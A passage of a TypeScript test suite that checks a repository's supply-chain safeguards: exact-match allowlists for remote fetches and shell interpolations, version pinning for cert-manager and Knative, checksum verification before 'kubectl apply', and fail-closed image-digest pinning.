  it('round 5: every remote-fetch allowlist entry matches EXACTLY ONE call site in the real tree', () => {
    const { allowHits } = scanRealTree();
    expect(REMOTE_FETCH_ALLOWLIST.length).toBeGreaterThan(0);
    for (const e of REMOTE_FETCH_ALLOWLIST)
      expect({ id: e.id, hits: allowHits.get(e.id) ?? 0 }).toEqual({ id: e.id, hits: 1 });
  });

  // ---- #1410 round 7: the statement allowlist (the four real interpolations) --

  const readTracked = (p: string) => readFileSync(join(ROOT, p), 'utf8');
  const scanFile = (p: string, text = readTracked(p)) =>
    unsafeApplies(text, { file: p, resolveSource: sourceResolver(p), allowHits: new Map() });

  it('round 7: the statement allowlist names exactly the four known sites', () => {
    expect(STATEMENT_ALLOWLIST.length).toBe(4);
    expect(new Set(STATEMENT_ALLOWLIST.map((e) => e.id)).size).toBe(4);
    expect(
      STATEMENT_ALLOWLIST.map((e) => `${e.file.split('/').pop()}: ${e.anchor}`).sort(),
    ).toEqual(
      [
        '_restore-writable.sh: { name: CTL_B64, value: "$_ctl" }',
        '_verify-app-restore.sh: awk -v lsn="$MODE_LSN"',
        '_verify-objstore.sh: awk -v lsn="$STATIC_LSN"',
        '_verify-restore.sh: awk -v lsn="$STATIC_LSN"',
      ].sort(),
    );
  });

  it('round 7: every statement-allowlist entry is live and its anchor occurs EXACTLY ONCE in its file', () => {
    const { allowHits } = scanRealTree();
    for (const e of STATEMENT_ALLOWLIST) {
      expect({ id: e.id, live: (allowHits.get(e.id) ?? 0) > 0 }).toEqual({ id: e.id, live: true });
      expect({ id: e.id, occurrences: readTracked(e.file).split(e.anchor).length - 1 }).toEqual({
        id: e.id,
        occurrences: 1,
      });
    }
  });

  it('round 7: removing ANY statement-allowlist entry reds the real-tree scan of its file', () => {
    for (const e of [...STATEMENT_ALLOWLIST]) {
      expect({ id: e.id, offenders: scanFile(e.file) }).toEqual({ id: e.id, offenders: [] });
      const at = STATEMENT_ALLOWLIST.indexOf(e);
      STATEMENT_ALLOWLIST.splice(at, 1);
      try {
        expect({ id: e.id, flagged: scanFile(e.file).length > 0 }).toEqual({
          id: e.id,
          flagged: true,
        });
      } finally {
        STATEMENT_ALLOWLIST.splice(at, 0, e);
      }
    }
    expect(STATEMENT_ALLOWLIST.length).toBe(4);
  });

  it('round 7: an entry matches its statement byte-exactly — one changed byte in the site, or the same text in another file, is an offender', () => {
    for (const e of STATEMENT_ALLOWLIST) {
      const text = readTracked(e.file);
      // One extra space INSIDE the statement (a prefix/pattern match would still pass).
      const widened = text.replace(e.anchor, e.anchor.replace(' ', '  '));
      expect({ id: e.id, changed: widened !== text }).toEqual({ id: e.id, changed: true });
      expect({ id: e.id, flagged: scanFile(e.file, widened).length > 0 }).toEqual({
        id: e.id,
        flagged: true,
      });
      // The allowlist is keyed by file: the same text elsewhere is not blessed.
      const elsewhere = unsafeApplies(text, { file: 'scripts/not-the-allowlisted-file.sh' });
      expect({ id: e.id, flagged: elsewhere.length > 0 }).toEqual({ id: e.id, flagged: true });
    }
  });

  // ---- #1410 round 5, finding 3: pinned versions fail fast, by name --------

  it('round 5: the szpg drill rejects a cert-manager / Knative version override, naming the pin, before any cluster work', () => {
    for (const [name, value, pin] of [
      ['CERT_MANAGER_VERSION', 'v1.16.1', 'apply-cert-manager.sh'],
      ['KNATIVE_VERSION', 'v1.17.0', 'apply-knative-kourier.sh'],
    ]) {
      const r = runStubbed(SZPG_PROFILE_B_SCRIPT, ['up'], { [name]: value });
      expect(r.status).not.toBe(0);
      expect(r.stderr).toContain(`${name}=${value} cannot be honoured`);
      expect(r.stderr).toContain(pin);
      expect(r.stderr).not.toContain('STUB'); // failed BEFORE touching kind/kubectl
    }
    // The pins themselves are accepted: the run proceeds to the (stubbed) kind.
    const ok = runStubbed(SZPG_PROFILE_B_SCRIPT, ['up'], {
      CERT_MANAGER_VERSION: 'v1.16.2',
      KNATIVE_VERSION: 'v1.16.0',
    });
    expect(ok.stderr).not.toContain('cannot be honoured');
    expect(ok.stderr).toContain('STUB kind');
  });

  it('round 5: apply-knative-kourier.sh rejects an unpinned version by name, before downloading', () => {
    const r = runStubbed(KNATIVE_SCRIPT, ['knative-v1.17.0'], {});
    expect(r.status).not.toBe(0);
    expect(r.stderr).toContain('this script pins knative-v1.16.0');
    expect(r.stderr).not.toContain('STUB curl');
  });

  it('pin-known-images.sh fails closed on a second image on one line, a comment-borne digest, and a block-scalar value (#1410 round 4)', () => {
    const cases = {
      secondOnLine: `x: [{image: "docker.io/a/b@sha256:${'0'.repeat(64)}"}, {image: docker.io/new/img:v1}]`,
      digestInComment: 'image: docker.io/new/img:v1 # @sha256:',
      truncatedDigest: 'image: docker.io/new/img@sha256:',
      blockScalar: 'image: >-\n  docker.io/new/img:v1',
    };
    for (const [name, body] of Object.entries(cases)) {
      const dir = mkdtempSync(join(tmpdir(), 'pin-known-images-test-'));
      try {
        const manifest = join(dir, 'manifest.yaml');
        writeFileSync(manifest, `apiVersion: v1\nkind: Pod\nspec:\n${body}\n`);
        let exitCode = 0;
        try {
          execFileSync('bash', [join(ROOT, PIN_SCRIPT), manifest, '--expect', '0'], {
            cwd: ROOT,
            stdio: 'pipe',
          });
        } catch (e) {
          exitCode = (e as { status?: number }).status ?? 1;
        }
        expect({ name, exitCode: exitCode !== 0 }).toEqual({ name, exitCode: true });
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('apply-cert-manager.sh checksum-verifies the download before applying, and pins images with an expected count', () => {
    const text = readFileSync(join(ROOT, CERT_MANAGER_SCRIPT), 'utf8');
    expect(text).toContain('curl -fsSL');
    expect(text).toMatch(/sha256sum -c/);
    expect(text).toMatch(/pin-known-images\.sh"[^\n]*--expect \d+/);
    expect(text).toContain('kubectl apply -f');
    // The checksum verify must run BEFORE the apply — a script that applies
    // first and checks after has already done the damage.
    const shaIdx = text.indexOf('sha256sum -c');
    const applyIdx = text.indexOf('kubectl apply -f');
    expect(shaIdx).toBeGreaterThan(-1);
    expect(applyIdx).toBeGreaterThan(shaIdx);
  });

  it('apply-knative-kourier.sh checksum-verifies all three downloads before applying, and pins images with an expected count', () => {
    const text = readFileSync(join(ROOT, KNATIVE_SCRIPT), 'utf8');
    expect(text.match(/sha256sum -c/g)?.length ?? 0).toBeGreaterThanOrEqual(1);
    expect(text).toMatch(/pin-known-images\.sh"[^\n]*--expect \d+/);
    // Three fetches (serving-crds, serving-core, kourier), three applies.
    expect(text.match(/kubectl apply -f/g)?.length ?? 0).toBe(3);
    const lastShaIdx = text.lastIndexOf('sha256sum -c');
    const firstApplyIdx = text.indexOf('kubectl apply -f');
    expect(firstApplyIdx).toBeGreaterThan(lastShaIdx);
  });

  it('the NetworkPolicy-enforcement drill checksum-verifies AND image-digest-pins Calico before applying it', () => {
    // #1413 review round 2, finding 4: the describe-block title above claims
    // "image-digest pinned" for every manifest this file covers, but until
    // this test the drill only checksummed the Calico MANIFEST — Calico's
    // three images (docker.io/calico/{cni,node,kube-controllers}:v3.28.2)
    // stayed tag-only, making the title's claim false for this one case.
    const text = readFileSync(join(ROOT, NETPOL_DRILL_SCRIPT), 'utf8');
    expect(text).toContain('curl -fsSL');
    expect(text).toMatch(/sha256sum -c/);
    expect(text).toMatch(/pin-known-images\.sh"[^\n]*--expect \d+/);
    const shaIdx = text.indexOf('sha256sum -c');
    const pinIdx = text.indexOf('pin-known-images.sh');
    const applyIdx = text.indexOf('kubectl apply -f');
    expect(shaIdx).toBeGreaterThan(-1);
    expect(pinIdx).toBeGreaterThan(shaIdx);
    expect(applyIdx).toBeGreaterThan(pinIdx);
  });

  it('image-digest-pins.json covers all three Calico images the drill pins', () => {
    const raw = readFileSync(join(ROOT, DIGEST_TABLE), 'utf8');
    const table = JSON.parse(raw) as Record<string, string>;
    for (const img of [
      'docker.io/calico/cni:v3.28.2',
      'docker.io/calico/node:v3.28.2',
      'docker.io/calico/kube-controllers:v3.28.2',
    ]) {
      expect(Object.hasOwn(table, img)).toBe(true);
      expect(table[img]).toMatch(/^sha256:[0-9a-f]{64}$/);
    }
  });

  it('pin-known-images.sh fails closed on a pin-count mismatch — BEHAVIOURALLY: exit code ≠ 0 against a manifest with the wrong number of known images', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pin-known-images-test-'));
    try {
      const manifest = join(dir, 'manifest.yaml');
      // Contains ZERO known images, but --expect 1 demands one pin.
      writeFileSync(manifest, 'apiVersion: v1\nkind: Pod\nspec: {}\n');
      let exitCode = 0;
      try {
        execFileSync('bash', [join(ROOT, PIN_SCRIPT), manifest, '--expect', '1'], {
          cwd: ROOT,
          stdio: 'pipe',
        });
      } catch (e) {
        exitCode = (e as { status?: number }).status ?? 1;
      }
      expect(exitCode).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('pin-known-images.sh fails closed on a NEW, unrecognized mutable-tag image — BEHAVIOURALLY: exit code ≠ 0 even when the KNOWN images all pin correctly', () => {
    // #1413 review round 2: --expect only proves the table's KNOWN entries
    // still match; it says nothing about an image the table has never heard
    // of. This proves the standalone "any image: line lacking @sha256 fails"
    // guard added to pin-known-images.sh actually fires.
    const dir = mkdtempSync(join(tmpdir(), 'pin-known-images-test-'));
    try {
      const manifest = join(dir, 'manifest.yaml');
      writeFileSync(
        manifest,
        [
          'apiVersion: v1',
          'kind: Pod',
          'spec:',
          '  containers:',
          '    - name: cert-manager-controller',
          '      image: quay.io/jetstack/cert-manager-controller:v1.16.2',
          '    - name: new-sidecar',
          '      image: docker.io/newvendor/newimage:v2.0.0',
        ].join('\n'),
      );
      let exitCode = 0;
      try {
        execFileSync('bash', [join(ROOT, PIN_SCRIPT), manifest, '--expect', '1'], {
          cwd: ROOT,
          stdio: 'pipe',
        });
      } catch (e) {
        exitCode = (e as { status?: number }).status ?? 1;
      }
      expect(exitCode).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('pin-known-images.sh fails closed on flow-style, JSON-style, and next-line image values (#1410 review round 3, finding 4)', () => {
    // The old scan anchored the whole line to `^...image:...$`, so it only
    // ever saw the block-style `image: repo:tag` (optionally list-prefixed)
    // form. Flow-style YAML (`{image: repo:tag}`), a JSON-quoted key
    // (`"image": "repo:tag"`), and a scalar value placed on the line AFTER
    // `image:` (also valid YAML) all sailed through unpinned.
    const dir = mkdtempSync(join(tmpdir(), 'pin-known-images-test-'));
    try {
      const manifest = join(dir, 'manifest.yaml');
      writeFileSync(
        manifest,
        [
          'apiVersion: v1',
          'kind: Pod',
          'spec:',
          '  containers:',
          '    - name: flowstyle',
          '      x: {image: docker.io/newvendor/flowimage:v2.0.0, name: foo}',
          '    - name: json',
          '      "image": "docker.io/newvendor/jsonimage:v3.0.0"',
          '    - name: nextline',
          '      image:',
          '        docker.io/newvendor/nextlineimage:v4.0.0',
        ].join('\n'),
      );
      let exitCode = 0;
      try {
        execFileSync('bash', [join(ROOT, PIN_SCRIPT), manifest, '--expect', '0'], {
          cwd: ROOT,
          stdio: 'pipe',
        });
      } catch (e) {
        exitCode = (e as { status?: number }).status ?? 1;
      }
      expect(exitCode).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('pin-known-images.sh succeeds BEHAVIOURALLY on a fully-pinned, correctly-counted manifest', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pin-known-images-test-'));
    try {
      const manifest = join(dir, 'manifest.yaml');
      writeFileSync(
        manifest,
        [
          'apiVersion: v1',
          'kind: Pod',
          'spec:',
          '  containers:',
          '    - name: cert-manager-controller',
          '      image: quay.io/jetstack/cert-manager-controller:v1.16.2',
        ].join('\n'),
      );
      // Must NOT throw.
      execFileSync('bash', [join(ROOT, PIN_SCRIPT), manifest, '--expect', '1'], {
        cwd: ROOT,
        stdio: 'pipe',
      });
      const pinned = readFileSync(manifest, 'utf8');
      expect(pinned).toContain('@sha256:');
      expect(pinned).not.toMatch(/image:.*:v1\.16\.2\s*$/m);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('operator-bundle-e2e.yml triggers on changes to scripts/kind-manifests/** (a change there must re-run the e2e it feeds)', () => {
    const text = readFileSync(join(ROOT, '.github/workflows/operator-bundle-e2e.yml'), 'utf8');
    const occurrences = text.match(/scripts\/kind-manifests\/\*\*/g);
    // Both pull_request and push:branches[main] trigger blocks need the path.
    expect(occurrences?.length ?? 0).toBeGreaterThanOrEqual(2);
  });

  it('image-digest-pins.json entries are well-formed sha256 digests', () => {
    const raw = readFileSync(join(ROOT, DIGEST_TABLE), 'utf8');
    const table = JSON.parse(raw) as Record<string, string>;
    const entries = Object.entries(table).filter(([k]) => k !== '_comment');
    expect(entries.length).toBeGreaterThanOrEqual(4);
    for (const [ref, digest] of entries) {
      expect(ref).toMatch(/^[a-z0-9.-]+\/[a-z0-9-]+\/[a-z0-9-]+:[\w.-]+$/i);
      expect(digest).toMatch(/^sha256:[0-9a-f]{64}$/);
    }
  });

  it('image-digest-pins.json attributes the rewrite behavior to the script that actually exists', () => {
    const raw = readFileSync(join(ROOT, DIGEST_TABLE), 'utf8');
    const table = JSON.parse(raw) as Record<string, string>;
    // The comment may mention the old, nonexistent script name to EXPLAIN the
    // correction, but the verb describing what actually rewrites the
    // manifest must be attached to the real script (pin-known-images.sh),
    // never left attributed to the one that does not exist.
    expect(table._comment).toMatch(/pin-known-images\.sh[\s\S]{0,80}rewrites/);
    expect(table._comment).not.toMatch(/(?<!not )apply-pinned-manifest\.sh[\s\S]{0,80}rewrites/i);
    // And the real script must actually be present on disk.
    expect(statSync(join(ROOT, PIN_SCRIPT)).isFile()).toBe(true);
  });

  it('all shell scripts are executable', () => {
    for (const script of [CERT_MANAGER_SCRIPT, KNATIVE_SCRIPT, PIN_SCRIPT]) {
      const mode = statSync(join(ROOT, script)).mode;
      const execBits = mode % 512; // low 9 bits: rwxrwxrwx
      expect(execBits & 0o111).toBeGreaterThan(0);
    }
  });
});
